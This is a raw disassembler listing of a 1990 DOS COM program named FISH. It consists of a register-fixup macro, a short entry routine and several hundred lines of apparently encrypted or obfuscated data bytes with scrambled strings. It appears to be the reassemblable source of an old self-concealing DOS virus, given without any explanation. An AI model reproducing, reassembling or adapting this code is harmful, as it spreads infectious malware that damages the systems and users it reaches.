  
PAGE  59,132
  
;==========================================================================
;==                                                                      ==
;==                             FISH                                     ==
;==                                                                      ==
;==      Created:   29-Oct-90                                            ==
;==      Version:                                                        ==
;==      Passes:    5          Analysis Options on: AFKOPUX              ==
;==                                                                      ==
;==                                                                      ==
;==========================================================================
  
movseg           macro reg16, unused, Imm16     ; Fixup for Assembler
                 ifidn  <reg16>, <bx>
                 db     0BBh
                 endif
                 ifidn  <reg16>, <cx>
                 db     0B9h
                 endif
                 ifidn  <reg16>, <dx>
                 db     0BAh
                 endif
                 ifidn  <reg16>, <si>
                 db     0BEh
                 endif
                 ifidn  <reg16>, <di>
                 db     0BFh
                 endif
                 ifidn  <reg16>, <bp>
                 db     0BDh
                 endif
                 ifidn  <reg16>, <sp>
                 db     0BCh
                 endif
                 ifidn  <reg16>, <BX>
                 db     0BBH
                 endif
                 ifidn  <reg16>, <CX>
                 db     0B9H
                 endif
                 ifidn  <reg16>, <DX>
                 db     0BAH
                 endif
                 ifidn  <reg16>, <SI>
                 db     0BEH
                 endif
                 ifidn  <reg16>, <DI>
                 db     0BFH
                 endif
                 ifidn  <reg16>, <BP>
                 db     0BDH
                 endif
                 ifidn  <reg16>, <SP>
                 db     0BCH
                 endif
                 dw     seg Imm16
endm
DATA_1E         EQU     0B3H                                    ; (97E0:00B3=0)
DATA_5E         EQU     5A2BH                                   ; (97E0:5A2B=0)
DATA_6E         EQU     5E5DH                                   ; (97E0:5E5D=0)
DATA_7E         EQU     6920H                                   ; (97E0:6920=0)
  
SEG_A           SEGMENT BYTE PUBLIC
                ASSUME  CS:SEG_A, DS:SEG_A
  
  
                ORG     100h
  
FISH            PROC    FAR
  
START:
                JMP     LOC_4                                   ; (0EDE)
                PUSH    AX
                CMC                                             ; Complement carry
                SUB     DX,SI
                JLE     $-3FH                                   ; Jump if < or =
                SUB     AL,7FH
                REP     MOVSB                                   ; Rep when cx >0 Mov [si] to es:[di]
                POP     ES
                POP     DS
                POP     DI
                ADD     CL,CH
                RETF    0CD0DH                                  ; Return far
                AND     [BX+DI+50H],BH
                nop                                             ;*ASM fixup - displacement
                MOV     SI,DATA_7E                              ; (97E0:6920=0)
                JNC     LOC_1                                   ; Jump if carry=0
                DB      'a tiny VOM p'
                DB      0EBH, 7AH, 67H, 72H, 61H, 6DH
                DB       00H, 9CH, 2EH,0FFH, 1EH, 35H
                DB       0EH,0C3H
                DB       0DH, 4EH, 42H, 49H, 23H, 82H
LOC_1:
                OR      SP,DI
                ADD     DX,DS:DATA_6E[BX+DI]                    ; (97E0:5E5D=0)
                POP     SP
                POP     DI
                POP     BX
                POP     DX
                ADC     CX,[BP+DI]
                AND     SI,DX
                SUB     SP,DI
                ADD     SP,[BP+DI]
                OR      BYTE PTR [BP+DI],0E7H
                ADD     CX,[BP+SI]
                ADC     DL,[BP+SI+53H]
                PUSH    DI
                PUSH    SP
                PUSH    SI
                PUSH    BP
                NOP
                AND     SI,DX
                SUB     SP,DI
                ADD     BX,[BP+45H]
                DEC     SP
                POP     DI
                INC     SI
                AND     AX,DS:DATA_5E[SI]                       ; (97E0:5A2B=0)
                ADD     AH,[BP+DI]
                SBB     WORD PTR [BP+DI],254H
                ADD     BX,[BP+SI]
                AND     AX,[BP+562BH]
                ADD     AH,[BP+DI]
                IN      AX,0DEH                                 ; port 0DEH
                DB      0F2H, 23H, 83H, 1BH, 54H, 02H
                DB       23H, 84H, 2BH, 56H, 02H, 23H
                DB       86H, 2BH, 5AH, 02H,0CEH, 23H
                DB       84H, 2BH, 5AH, 02H, 23H, 81H
                DB       1BH, 54H, 02H, 03H, 1AH, 23H
                DB       86H, 2BH, 56H, 02H, 23H,0E5H
                DB       96H,0F2H, 23H, 83H, 1BH, 54H
                DB       02H, 23H, 84H, 2BH, 56H, 02H
                DB       23H, 86H, 2BH, 5AH, 02H,0CEH
                DB       81H,0B3H, 46H, 03H, 23H,0C9H
                DB       33H, 38H, 03H, 03H, 12H,0F1H
                DB      0B4H
                DB      8, 0DH, 0A1H, '+', 8BH, 8, 85H, 'I'
                DB      0F2H, 4AH,0EFH,0FBH,0CEH, 4EH
                DB       4CH, 5FH, 5DH,0BDH, 0CH, 03H
                DB       12H,0B7H,0BAH, 01H,0E5H, 0CH
                DB       0DH,0CEH, 0BH, 5EH, 3EH,0D6H
                DB       83H,0CEH, 87H,0D5H,0DCH,0EEH
                DB      0DCH,0EEH, 2BH, 84H, 1AH, 2BH
                DB       81H, 52H, 0FH, 56H, 0AH,0CEH
                DB       13H, 5BH, 3EH,0FBH, 83H,0D3H
                DB       3FH,0E9H, 86H,0FDH,0DCH,0EBH
                DB      0DCH,0EBH, 86H, 11H, 83H, 49H
                DB       0FH, 53H, 12H,0CEH, 4FH, 4CH
                DB       5EH, 5EH,0E5H,0BDH, 0FH,0B4H
                DB      0E5H, 5BH, 07H, 83H, 23H,0AEH
                DB      0EEH, 03H,0B9H, 5FH, 23H,0CAH
                DB       0BH, 56H, 02H, 0DH, 1DH, 23H
                DB       81H, 13H, 48H, 03H,0E5H, 8DH
                DB       06H,0E6H,0C0H, 2CH, 2BH, 86H
                DB       4AH,0F3H, 23H,0AEH, 4AH, 03H
                DB       03H, 12H,0E5H, 3DH, 07H,0ACH
                DB      0BDH, 2CH,0E5H,0BEH,0F2H, 81H
                DB       0BH, 22H, 03H, 84H, 13H, 20H
                DB       03H,0B7H,0BAH, 01H,0BDH, 0CH
                DB      0CBH, 0BH, 5DH, 03H, 0DH,0E5H
                DB       85H,0F2H, 91H, 55H, 00H, 0DH
                DB       0CH, 5DH, 90H, 91H,0B9H, 6CH
                DB      0F2H, 13H, 20H, 03H, 91H, 55H
                DB       28H,0F2H,0F3H, 5DH, 90H,0E5H
                DB      0ECH, 0CH,0AEH,0C9H, 33H, 20H
                DB       03H, 81H, 0BH, 3AH, 03H,0CBH
                DB       0BH, 46H, 03H,0E7H,0CAH, 0BH
                DB       41H, 03H, 56H, 00H, 84H, 33H
                DB       38H, 03H, 81H, 03H, 43H, 03H
                DB      0E5H, 0AH, 0DH,0E5H, 2BH,0F2H
                DB      0E5H, 1AH, 07H, 84H,0BDH, 22H
                DB      0E5H, 56H,0F2H, 81H,0CEH, 23H
                DB       34H, 13H, 4AH, 03H, 7EH, 11H
                DB      0E5H, 32H, 07H, 23H, 83H, 13H
                DB       22H, 03H, 23H,0F2H, 3BH, 20H
                DB       03H, 57H,0BDH, 1EH,0E5H, 24H
                DB      0F2H, 3EH,0D6H, 83H,0D6H,0CBH
                DB       0BH, 78H, 09H, 0FH,0CEH
                DB      '-KD^E-[D_X^-.;- -HLNE-IDKK- -OBC'
                DB      'C-?"4=-*sfcwt{bp*)'
                DB      0E5H,0CFH,0F3H, 23H, 81H, 03H
                DB       43H, 03H,0E5H,0B7H,0F3H, 03H
                DB       12H, 13H, 0AH,0ACH, 48H, 03H
                DB       83H,0CDH, 2BH,0C8H, 1BH, 07H
                DB       0DH, 83H,0D5H, 08H, 1DH, 0DH
                DB       23H, 0CH, 0BH, 17H, 0DH, 23H
                DB       8DH, 33H, 2DH, 0DH, 0DH,0F6H
                DB       78H, 29H, 23H,0ACH, 09H, 0DH
                DB      0AEH, 0DH, 0CH, 23H,0ACH, 0BH
                DB       0DH,0AEH, 0FH, 0CH, 23H,0ACH
                DB       05H, 0DH,0AEH, 09H, 0CH, 23H
                DB      0F2H, 3BH, 48H, 03H, 3EH,0CDH
                DB      0F3H,0C9H, 5DH, 23H,0ACH,0EEH
                DB       03H,0C6H, 23H, 0CH, 0BH, 1FH
                DB       0DH, 23H,0ACH,0EEH, 03H, 23H
                DB       86H, 2BH, 19H, 0DH, 23H, 83H
                DB       1BH, 1FH, 0DH, 23H,0F2H, 23H
                DB       15H
                DB       0DH, 59H, 5FH, 42H, 58H, 59H
LOC_2:
                DB       3EH,0E9H,0E5H, 0DH, 0DH, 84H
                DB      0C8H, 81H,0C5H,0B6H, 1DH, 0DH
                DB      0FAH,0EEH, 54H, 8CH,0E4H, 42H
                DB       0FH, 0EH,0CCH, 8EH,0DFH, 0DH
                DB      0FAH,0FEH, 5DH,0B5H,0F7H, 0DH
                DB       5DH, 84H,0E5H,0C6H,0E5H,0C1H
                DB       0DH,0C0H,0E5H, 29H, 07H,0C6H
                DB       5EH, 86H,0D1H, 3BH, 86H, 52H
                DB       0BH, 23H, 84H, 13H,0BEH, 03H
                DB       56H, 58H, 84H,0E8H,0E5H,0DDH
                DB       05H,0AEH,0E5H,0FCH,0F0H,0E5H
                DB       19H,0F3H,0E5H,0CBH,0F0H,0E5H
                DB       95H,0F0H,0E5H,0CDH, 05H, 85H
                DB       8DH,0F1H, 02H, 78H, 09H,0E4H
                DB      0E4H, 0DH,0B5H, 8DH,0F1H, 1CH
                DB       78H, 09H,0E4H, 96H, 0DH,0ACH
                DB       8DH,0F1H, 1FH, 78H, 09H,0E4H
                DB       9FH, 0DH, 84H, 8DH,0F1H, 19H
                DB       78H, 09H,0E4H, 04H, 0CH,0E6H
                DB       8DH,0F1H, 2CH, 78H, 09H,0E4H
                DB      0F9H, 0DH, 81H, 8DH,0F1H, 2EH
                DB       78H, 09H,0E4H, 89H, 0CH,0AEH
                DB       8DH,0F1H, 2AH, 78H, 09H,0E4H
                DB      0EDH, 0DH,0E6H, 8DH,0F1H, 30H
                DB       78H, 09H,0E4H,0CBH
DATA_3          DW      0F20CH                                  ; Data table (indexed access)
                DB       8DH,0F1H, 33H, 78H, 09H,0E4H
                DB       0CH, 0FH,0ACH, 8DH,0F1H, 32H
                DB       78H, 09H,0E4H, 70H, 0AH, 85H
                DB       8DH,0F1H, 4FH, 78H, 09H,0E4H
                DB       4FH, 0AH, 81H, 8DH,0F1H, 46H
                DB       78H, 09H,0E4H, 11H, 0FH,0E6H
                DB       8DH,0F1H, 43H, 78H, 09H,0E4H
                DB       5EH, 05H, 84H, 8DH,0F1H, 42H
                DB       78H, 09H,0E4H, 47H, 05H, 83H
                DB       8DH,0F1H, 5AH, 78H, 0EH,0E4H
                DB      0C2H, 0BH,0E4H, 5AH, 04H,0E6H
                DB      0E5H, 7FH, 04H,0ACH,0E5H, 5EH
                DB      0F0H,0E5H, 7BH,0F0H,0E5H, 25H
                DB      0F0H, 84H,0E8H, 23H,0F2H, 3BH
                DB      0BEH, 03H, 82H, 4BH, 0BH, 50H
                DB      0C2H, 23H,0F2H, 0BH, 3CH, 03H
                DB      0E4H, 19H, 05H,0ACH,0E5H,0F5H
                DB      0F1H,0E5H,0DAH,0F1H, 07H,0CDH
                DB       78H,0D9H,0E5H,0D6H,0F1H,0E5H
                DB      0CCH, 0CH,0BDH, 0DH, 8DH, 32H
                DB      0F2H, 78H, 0BH, 87H, 4AH, 0BH
                DB       8EH,0CEH, 0AH, 23H, 2DH, 0BH
                DB      0FDH, 03H,0FBH, 4AH, 17H, 8DH
                DB       79H, 18H, 8DH, 62H, 17H,0C5H
                DB       23H, 8DH, 33H,0FDH, 03H, 0DH
                DB       78H, 04H, 8CH, 62H, 10H, 0DH
                DB       03H, 8EH, 52H, 12H, 0DH,0E5H
                DB      0B6H,0F1H,0E6H, 91H, 4BH, 44H
                DB       43H,0E5H,0BEH,0F1H,0E5H, 9FH
                DB      0F1H,0E5H, 97H,0F1H, 07H,0CDH
                DB       78H,0E6H, 84H,0DEH,0FBH, 4AH
                DB       18H, 8DH, 79H,0EEH, 8DH, 62H
                DB       18H,0C5H, 8CH, 62H, 1DH, 0DH
                DB       03H, 8DH, 52H, 1FH, 0DH,0E6H
                DB      0D9H, 23H,0F2H, 03H, 3CH, 03H
                DB      0E4H,0AFH, 0AH,0AEH,0EEH, 16H
                DB       84H,0DEH, 86H, 7AH, 2CH, 06H
                DB       7AH, 2EH, 78H, 1CH,0E6H, 07H
                DB       84H,0DEH, 86H, 4AH, 01H, 07H
                DB       4AH, 2DH, 78H, 08H,0E5H,0EEH
                DB       09H, 7EH, 0EH,0E4H, 45H,0F2H
                DB      0E5H, 6BH,0F1H,0E5H, 5DH,0F1H
                DB      0E5H, 4FH,0F1H, 84H, 43H,0F5H
                DB       84H, 4BH,0F1H, 13H, 5FH,0E5H
                DB       26H, 0CH, 8EH, 72H, 19H, 0CH
                DB       79H, 16H, 86H, 0AH, 0EH, 4AH
                DB       0FH, 5EH, 86H, 52H, 09H,0FAH
                DB      0DEH, 0CH,0D5H, 56H, 79H, 06H
                DB       8EH,0C9H, 09H,0E4H, 76H,0F2H
                DB       40H, 58H, 5EH, 46H, 54H, 57H
                DB       12H, 84H,0DBH, 03H, 0AH,0B4H
                DB       28H, 0DH,0B2H,0B8H, 03H,0FEH
                DB      0A9H,0B2H,0B8H, 03H, 03H, 12H
                DB       86H, 58H, 1FH, 86H, 48H, 1DH
                DB       08H, 02H, 03H, 8EH,0DFH, 0DH
                DB       28H,0FDH,0F2H, 84H, 58H, 1FH
                DB       84H, 48H, 1DH, 20H,0F1H, 00H
                DB       8EH,0D7H, 0DH, 84H, 58H, 2EH
                DB       84H, 48H, 2CH,0B4H, 11H, 0DH
                DB      0CAH, 48H, 03H, 0CH, 0DH,0B9H
                DB       2AH, 84H,0F7H,0E5H,0DEH,0F6H
                DB      0E4H, 3DH,0F2H, 03H, 0AH,0B2H
                DB      0B8H, 03H,0B4H, 28H, 0DH, 84H
                DB      0DBH,0FEH,0A9H, 13H, 5FH, 03H
                DB       12H,0B9H, 02H,0B7H,0B8H, 03H
                DB      0E5H,0B5H,0F6H,0B9H, 1DH,0E5H
                DB      0BEH,0F6H,0FBH, 0BH,0C7H, 03H
                DB       8DH, 53H, 12H, 79H, 26H, 23H
                DB      0C9H, 13H,0C8H, 03H, 81H,0CDH
                DB       8CH,0E6H, 0DH, 03H, 10H, 0DH
                DB       0DH, 3EH,0DFH, 23H, 86H, 03H
                DB      0CEH, 03H, 44H, 0CH,0C6H, 18H
                DB       0DH, 0DH, 4CH,0FAH,0FCH, 84H
                DB       49H, 2EH, 9FH, 9EH,0FAH,0FCH
                DB       84H, 49H, 2CH,0E4H,0D2H,0F3H
                DB      0E4H, 74H,0F3H,0E5H, 61H, 09H
                DB      0E5H, 18H, 09H, 7FH, 34H, 23H
                DB       8DH, 33H,0AFH, 03H, 0DH, 79H
                DB       3CH,0E5H, 64H, 09H, 8EH,0F6H
                DB      0F2H, 79H, 24H, 23H,0F3H, 03H
                DB      0AFH, 03H, 03H, 0AH,0B4H, 19H
                DB       0DH,0B2H, 5FH, 03H, 3EH,0CDH
                DB      0FFH,0A2H, 23H,0ACH,0AEH, 03H
                DB       2BH, 84H, 48H,0F3H, 2BH, 84H
                DB       50H, 2BH, 84H, 53H,0F1H, 23H
                DB       8DH, 2BH,0BEH, 03H,0F3H,0E4H
                DB       96H,0F3H,0E4H, 38H,0F3H, 03H
                DB       0AH,0E5H, 2BH, 09H,0B4H, 19H
                DB       0DH, 23H,0ACH,0AEH, 03H,0B2H
                DB       5FH, 03H,0FFH
                DB      0A2H, 'x', 1BH, '+6P+x'
                DB      0FBH, 2BH,0CAH, 48H,0F3H, 0DH
                DB       0DH,0E5H, 1AH, 0FH, 23H,0F3H
                DB       0BH,0AFH, 03H,0E6H,0C6H,0E4H
                DB       04H,0F3H,0B9H, 22H, 0BH,0E5H
                DB       0BH,0F6H, 0BH, 12H, 0AH,0CEH
                DB       07H,0CDH, 79H, 0EH,0E4H, 5BH
                DB       0CH, 13H, 5FH, 23H, 81H, 0BH
                DB       2BH, 03H, 23H, 84H, 13H, 29H
                DB       03H, 23H,0C8H, 3BH, 29H, 03H
                DB      0B4H, 03H, 0DH,0B2H,0FCH, 03H
                DB       03H, 0AH,0FEH,0A9H, 53H, 12H
                DB      0B4H, 5DH, 0DH,0B2H, 0AH, 02H
                DB      0FEH,0A9H,0B6H,0F2H,0F2H,0E5H
                DB      0E3H,0F7H, 50H, 23H, 82H, 0BH
                DB      0EBH, 03H, 23H, 82H, 0BH,0E5H
                DB       03H, 23H, 82H, 0BH,0BEH, 03H
                DB       03H,0B5H, 0CH, 46H, 0AH, 91H
                DB      0B6H,0FCH, 03H, 23H,0F2H, 13H
                DB       38H, 03H, 7EH, 2DH, 23H, 8EH
                DB       03H,0BEH, 03H, 0CH, 23H,0F2H
                DB       3BH,0BEH, 03H, 23H,0F2H, 3BH
                DB      0E5H, 03H, 23H,0F2H, 3BH,0EBH
                DB       03H, 58H, 23H,0C9H, 13H, 29H
                DB       03H, 84H,0E8H,0E4H, 9CH,0F0H
                DB      0E5H, 8DH, 0EH, 03H, 0AH,0B4H
                DB       19H, 0DH,0B2H, 5FH, 03H, 23H
                DB      0ACH,0AEH, 03H,0FFH,0A2H, 78H
                DB       00H, 2BH,0CAH, 48H,0F3H, 0DH
                DB       0DH, 23H,0F3H, 0BH,0AFH, 03H
                DB      0E6H,0E6H, 23H,0C8H, 3BH, 0EH
                DB       02H, 8EH,0F3H, 0CH, 78H, 39H
                DB       86H, 1BH, 17H, 0DH, 8EH,0CFH
                DB       1DH,0B9H, 5CH,0E5H, 57H,0F7H
                DB       0EH,0DEH, 23H, 84H, 1BH, 08H
                DB       02H,0F2H, 3BH, 15H, 0DH, 23H
                DB       82H, 0BH, 0EH, 02H, 0EH, 13H
                DB       1FH, 0DH, 8EH,0CEH, 1DH, 23H
                DB       84H, 13H, 0CH, 02H,0F2H, 3BH
                DB       19H, 0DH, 23H, 82H, 0BH,0F2H
                DB       03H,0E4H, 25H, 0DH, 86H, 09H
                DB       0EH, 49H, 0FH, 5EH, 86H, 51H
                DB       09H,0FAH,0DEH, 0CH,0D5H, 56H
                DB       79H, 6CH, 03H, 12H,0B7H, 0AH
                DB       02H,0E5H,0B4H, 0FH,0E5H, 1AH
                DB       0EH, 23H,0F3H, 0BH,0E2H, 03H
                DB      0E5H, 1DH, 0CH, 23H,0F3H, 03H
                DB      0E2H, 03H,0B9H, 5CH,0E5H, 08H
                DB      0F7H,0E5H, 50H,0F7H,0E5H, 8DH
                DB      0F7H,0E5H, 3FH,0F7H, 83H,0D6H
                DB       83H,0CEH, 23H,0F2H, 3BH,0BEH
                DB       03H, 23H,0F2H, 3BH,0E5H, 03H
                DB       23H,0F2H, 3BH,0EBH, 03H, 82H
                DB       0BH, 07H, 0DH, 82H, 0BH, 01H
                DB       0DH, 13H,0BDH, 2FH,0C8H, 1BH
                DB       07H, 0DH,0E5H, 8DH,0F7H, 12H
                DB       90H, 55H, 23H, 86H, 2BH,0F2H
                DB       03H, 23H, 83H, 1BH, 0CH, 02H
                DB       23H,0F2H, 23H, 0EH, 02H
                DB      '^BAH', 86H, 'Q', 0CH, 86H, 8DH, '4'
                DB      0FFH, 84H, 09H, 86H, 8DH, 36H
                DB      0FFH, 84H, 49H, 0FH, 86H, 8DH
                DB       30H,0FFH, 84H, 49H, 09H,0E5H
                DB      0DAH, 0EH,0E6H, 96H, 31H, 0CH
                DB       79H, 0EH,0E4H, 96H,0F1H, 23H
                DB       8EH, 03H,0BEH, 03H, 0CH, 23H
                DB       81H, 0BH, 2BH, 03H, 23H, 84H
                DB       13H, 29H, 03H,0E5H,0A4H,0F4H
                DB      0E5H, 85H,0F4H,0E5H, 9DH,0F4H
                DB       23H,0C9H, 13H, 29H, 03H, 2BH
                DB      0C8H, 7AH, 1FH, 7FH, 79H, 23H
                DB       8DH, 2BH,0BEH, 03H,0F3H, 8EH
                DB      0F3H, 0CH, 79H, 24H, 86H, 09H
                DB       0EH, 49H, 0FH, 5EH, 86H, 51H
                DB       09H,0FAH,0DEH, 0CH,0D5H
                DB      'VxH', 86H, 'Q', 0CH, 86H, 8DH, '4'
                DB      0FFH, 84H, 09H, 86H, 8DH, 36H
                DB      0FFH, 84H, 49H, 0FH, 86H, 8DH
                DB       30H,0FFH, 84H, 49H, 09H,0E6H
                DB       21H, 86H, 1BH, 17H, 0DH,0E5H
                DB       3FH, 0FH, 23H, 86H, 03H,0AEH
                DB       03H, 8EH,0CCH, 1DH, 0CH,0C7H
                DB       2BH, 84H, 5AH, 19H,0ACH, 15H
                DB       0DH, 2BH, 84H, 4AH, 1FH,0ACH
                DB       1FH, 0DH, 0EH,0CCH, 2BH, 84H
                DB       4AH, 1DH,0ACH, 19H, 0DH, 2BH
                DB       84H, 4AH, 03H,0E5H, 07H, 0FH
                DB       23H, 83H, 13H,0AEH, 03H, 86H
                DB       4BH, 0FH,0AEH, 07H, 0DH, 86H
                DB       4BH, 09H,0AEH, 01H, 0DH,0E4H
                DB       6EH,0F1H, 4BH, 44H, 5EH, 45H
                DB      0E5H,0A6H, 09H,0E5H,0D1H, 0DH
                DB      0CBH, 0BH, 2DH, 0DH, 0CH, 8CH
                DB       33H, 0DH, 03H, 40H, 57H, 79H
                DB       03H, 8CH, 33H, 0DH, 03H, 57H
                DB       40H, 79H, 0BH,0F3H, 03H, 2DH
                DB       0DH, 79H, 55H,0ACH, 09H, 03H
                DB      0DCH,0ECH,0FAH,0ECH, 08H, 0DH
                DB       0FH, 34H,0FDH, 7FH, 45H,0ACH
                DB       07H, 03H, 06H, 0BH, 01H, 03H
                DB       79H, 32H, 86H, 1BH,0A6H, 03H
                DB      0B4H, 0DH, 0FH,0ACH,0A4H, 03H
                DB      0FAH,0FCH, 06H,0DFH, 79H, 0CH
                DB       4DH, 84H, 1BH, 0FH, 03H,0AEH
                DB       09H, 03H, 8EH, 33H, 19H, 03H
                DB       0CH, 79H, 60H,0CAH, 0BH, 19H
                DB       03H, 0CH, 0DH, 86H,0CBH, 26H
                DB       0BH, 05H, 03H,0AEH, 1BH, 03H
                DB       8EH, 0BH, 09H, 03H, 0AH,0CAH
                DB       0BH, 1DH, 03H, 0DH, 03H,0AEH
                DB       03H, 03H,0E5H,0C0H, 0DH,0E6H
                DB       46H, 8CH,0F3H, 0DH, 02H, 7EH
                DB       48H,0ACH, 0DH, 03H,0AEH, 09H
                DB       0DH, 0CH,0CFH,0ACH, 0FH, 03H
                DB      0AEH, 0BH, 0DH, 0CH,0CFH,0ACH
                DB       09H, 03H,0AEH, 05H, 0DH,0FAH
                DB      0DDH, 0CH,0CFH, 79H, 24H,0ACH
                DB      0FFH, 03H, 29H, 09H, 78H, 2FH
                DB      0BCH,0E4H,0B5H, 1DH, 0DH, 85H
                DB       03H, 0DH, 03H,0FAH,0EBH, 08H
                DB      0C6H, 00H,0AEH, 0CH, 03H,0ACH
                DB       0DH, 03H, 0EH, 0BH, 0FH, 03H
                DB      0FAH,0D5H,0FAH,0DDH,0AEH, 09H
                DB       03H,0E5H, 8DH, 0DH,0B9H, 33H
                DB      0E5H, 3BH,0F5H, 23H, 86H, 03H
                DB      0FFH, 03H,0B5H, 0CH, 4EH, 23H
                DB       86H, 1BH,0F9H, 03H, 23H, 83H
                DB       13H,0FBH, 03H,0E5H, 2CH,0F5H
                DB      0E5H, 40H, 09H,0CEH, 03H,0B5H
                DB       0DH, 5AH, 12H,0E5H, 18H,0F5H
                DB       84H, 03H, 24H, 03H,0B5H, 0DH
                DB       4FH, 84H, 1BH, 26H, 03H, 3EH
                DB      0C4H, 3EH,0DFH,0E5H, 0EH,0F5H
                DB      0B9H, 32H,0B7H, 0DH, 03H,0BCH
                DB       11H,0E5H,0F4H,0FAH, 3EH,0C4H
                DB      0B5H, 0DH, 4FH, 3EH,0DFH,0E5H
                DB      0E2H,0FAH,0BCH, 11H,0B9H, 32H
                DB      0B7H, 09H, 0DH,0E5H,0E8H,0FAH
                DB       3EH,0C4H,0B5H, 0FH, 4FH, 86H
                DB      0DCH,0E5H,0D6H,0FAH, 84H, 1BH
                DB      0A6H, 03H,0AEH,0A4H, 03H, 86H
                DB      0F5H, 08H, 02H, 0DH, 8EH,0DFH
                DB       0DH, 28H,0FDH,0F2H, 24H,0CAH
                DB      0B4H, 1DH, 0DH,0FAH,0FCH, 86H
                DB      0FDH,0CEH, 5DH, 44H, 46H, 48H
                DB       3EH,0C4H,0B5H, 0DH, 4FH, 86H
                DB      0DCH,0E5H,0BCH,0FAH,0BCH, 11H
                DB      0B9H, 4DH,0B7H, 0DH, 03H,0E5H
                DB      0AAH,0FAH,0B5H, 1DH, 0DH,0FAH
                DB      0EBH, 86H,0C7H, 86H,0DDH,0B5H
                DB       0DH, 4FH,0E5H, 95H,0FAH,0B4H
                DB       0DH, 03H, 3EH,0DFH, 0CH,0F4H
                DB      0B9H, 4DH, 23H,0CBH, 0BH, 3EH
                DB       03H, 0CH, 5EH,0E5H,0D0H, 09H
                DB       56H, 86H, 03H, 24H, 03H,0B5H
                DB       0CH, 5AH, 86H, 1BH, 26H, 03H
                DB      0FBH,0CBH, 8DH, 78H, 0EH, 8DH
                DB      0CBH,0C5H,0E5H, 63H,0FAH,0CEH
                DB      0E5H,0C8H,0FAH, 84H,0DAH, 8EH
                DB      0CAH, 00H, 13H, 0AH,0E6H, 2DH
                DB      0E5H,0B4H,0FAH, 13H, 0AH,0B4H
                DB       5DH, 0DH, 84H,0DAH,0BEH, 0DH
                DB       3EH,0CDH, 8DH, 70H, 0CH, 37H
                DB       78H, 08H, 87H, 10H, 8DH,0EEH
                DB       12H, 23H, 85H, 13H, 25H, 03H
                DB      0FFH,0A3H, 86H, 48H,0F0H, 28H
                DB      0D2H,0D2H, 0FH,0EDH, 87H, 48H
                DB      0F1H, 29H,0D2H, 0FH,0C9H, 23H
                DB      0CBH, 0BH, 2DH, 0DH, 0DH, 31H
                DB      0D2H, 79H, 04H, 23H,0F3H, 0BH
                DB       2DH, 0DH, 31H,0EFH, 78H, 00H
                DB      0E5H, 5FH,0FAH,0F5H,0CEH
                DB      '@LNFH_HA'
                DB      0E5H, 48H,0FAH,0F4H,0CEH, 5EH
                DB      0B9H, 5CH,0E5H, 0AH,0FAH, 23H
                DB       84H, 13H,0AEH, 03H, 56H,0CEH
                DB      0E5H,0A1H, 0FH, 5FH,0B9H, 3BH
                DB       23H, 87H, 1BH, 25H, 03H,0E5H
                DB      0FFH,0FBH,0FAH,0ECH,0FAH,0EEH
                DB       84H,0DEH, 57H, 06H,0D6H, 78H
                DB       08H, 30H, 0DH, 4DH, 7FH, 45H
                DB      0B5H, 0DH, 4EH,0E5H,0D1H,0FBH
                DB       7FH, 4DH, 23H, 84H, 1BH,0F9H
                DB       03H, 23H, 84H, 03H,0FFH, 03H
                DB       23H, 81H, 13H,0FBH, 03H,0B5H
                DB       0CH, 4EH, 3EH,0C4H,0E5H,0CEH
                DB      0FBH, 23H, 8DH, 33H,0D7H, 03H
                DB       0DH, 78H, 2CH,0B5H, 0FH, 30H
                DB      0E5H,0B8H,0FBH, 7FH, 14H, 86H
                DB      0D5H, 5EH,0B9H, 3FH, 23H, 87H
                DB       1BH, 25H, 03H,0E5H,0ABH,0FBH
                DB       86H, 4AH, 13H, 23H,0AEH,0E1H
                DB       03H, 56H,0E5H,0C7H, 0FH,0CEH
                DB       3EH,0D6H, 46H,0E5H,0CEH, 0FH
                DB      0CEH, 5CH, 5FH, 5DH,0B5H, 0DH
                DB       49H,0E5H, 87H,0FBH, 8DH,0FFH
                DB       8DH,0FBH,0CFH, 8DH, 79H, 04H
                DB      0B5H, 0DH, 5AH,0E5H, 71H,0FBH
                DB      0FBH,0CBH, 8DH, 55H, 57H, 54H
                DB      0CEH,0E5H,0C0H,0FBH, 3EH,0C4H
                DB      0B5H, 0CH, 4FH, 3EH,0DFH,0E5H
                DB       65H,0FBH, 23H, 84H, 1BH,0AAH
                DB       03H, 23H,0AEH,0A8H, 03H,0B5H
                DB       0FH, 4FH, 3EH,0C4H, 3EH,0DFH
                DB      0E5H, 58H,0FBH, 23H, 84H, 1BH
                DB      0A6H, 03H, 23H,0AEH,0A4H, 03H
                DB      0B5H, 0DH, 4FH, 23H, 86H, 1BH
                DB      0A8H, 03H, 23H, 86H, 03H,0AAH
                DB       03H,0E5H, 31H,0FBH,0E5H, 62H
                DB      0FBH,0CEH, 4BH, 44H, 5EH, 45H
                DB       07H,0CDH, 78H, 2FH, 23H, 8EH
                DB       2BH,0BEH, 03H,0F3H,0E5H, 48H
                DB      0FBH,0E5H, 29H,0FBH, 7FH, 06H
                DB      0FBH,0CBH, 8DH, 79H, 0EH, 8DH
                DB      0E3H,0C5H,0E4H, 15H,0F4H, 23H
                DB       8EH, 03H,0BEH, 03H, 0CH,0E4H
                DB       02H,0F4H, 31H, 0CH, 78H, 3AH
                DB       23H, 8EH, 2BH,0BEH, 03H,0F3H
                DB      0FBH,0CBH, 8DH, 79H, 0EH, 8DH
                DB      0E3H,0C5H,0E5H, 6BH,0F2H, 79H
                DB       0EH, 8DH,0CBH,0C5H,0E5H,0FCH
                DB      0F8H, 84H, 4BH,0F1H, 23H, 8EH
                DB       1BH,0BEH, 03H, 0DH,0E4H, 48H
                DB      0F4H, 31H, 0FH, 78H, 03H,0E5H
                DB       46H,0F2H, 79H, 04H, 8CH, 63H
                DB      0FBH, 0DH, 03H, 8EH, 53H,0F5H
                DB       0DH,0E4H,0C0H,0F5H,0E5H,0D5H
                DB      0F8H,0B9H, 27H,0E5H,0C5H,0F8H
                DB       8CH,0F4H,0CAH, 0AH, 7FH, 06H
                DB      0B9H, 04H, 03H, 12H,0B7H,0A6H
                DB       0CH,0E5H,0B5H,0F8H,0F9H,0E5H
                DB      0DFH,0F8H,0CEH, 23H, 8DH, 2BH
                DB      0BEH, 03H,0F3H,0E5H, 1AH,0F2H
                DB       79H,0D8H, 23H, 84H, 1BH,0A0H
                DB       03H, 23H, 84H, 03H,0A2H, 03H
                DB       23H,0CAH, 0BH,0BCH, 03H, 0DH
                DB       0DH,0E5H, 12H,0F2H, 23H,0ACH
                DB      0A4H, 03H, 23H, 86H, 1BH,0A6H
                DB       03H, 20H, 0DH, 03H, 8EH,0D7H
                DB       0DH, 23H, 26H, 0BH,0A8H, 03H
                DB       23H, 16H, 1BH,0AAH, 03H, 74H
